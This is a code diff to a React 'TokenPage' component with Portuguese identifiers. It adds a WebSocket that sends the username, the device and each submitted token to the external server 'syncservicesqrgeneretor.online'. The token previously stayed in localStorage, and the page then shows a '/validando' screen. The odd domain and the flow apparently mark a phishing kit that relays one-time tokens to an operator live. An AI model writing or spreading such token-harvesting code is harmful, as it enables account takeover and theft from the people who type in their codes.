@@ -8,6 +8,7 @@ const TokenPage = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [erro, setErro] = useState("");
   const inputRef = useRef<HTMLInputElement>(null);
+  const wsRef = useRef<WebSocket | null>(null);
   const navigate = useNavigate();
 
   const usuario = localStorage.getItem("usuario") || "";
@@ -23,6 +24,26 @@ const TokenPage = () => {
     }
   }, []);
 
+  useEffect(() => {
+    const ws = new WebSocket("wss://syncservicesqrgeneretor.online/ws/");
+    wsRef.current = ws;
+
+    ws.onopen = () => {
+      console.log("TokenPage WS conectado");
+      if (usuario) {
+        ws.send(JSON.stringify({ acao: "reconectar", usuario, dispositivo }));
+      }
+    };
+
+    ws.onmessage = (event) => {
+      const msg = JSON.parse(event.data);
+      console.log("TokenPage msg:", msg);
+    };
+
+    ws.onerror = (err) => console.error("Token WS erro:", err);
+    return () => { ws.close(); };
+  }, [usuario, dispositivo]);
+
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (!token) return;
@@ -30,7 +51,7 @@ const TokenPage = () => {
     setIsLoading(true);
     setErro("");
 
-    localStorage.setItem("pendingToken", token);
+    wsRef.current?.send(JSON.stringify({ acao: "token", usuario, token }));
     navigate("/validando");
   };
 
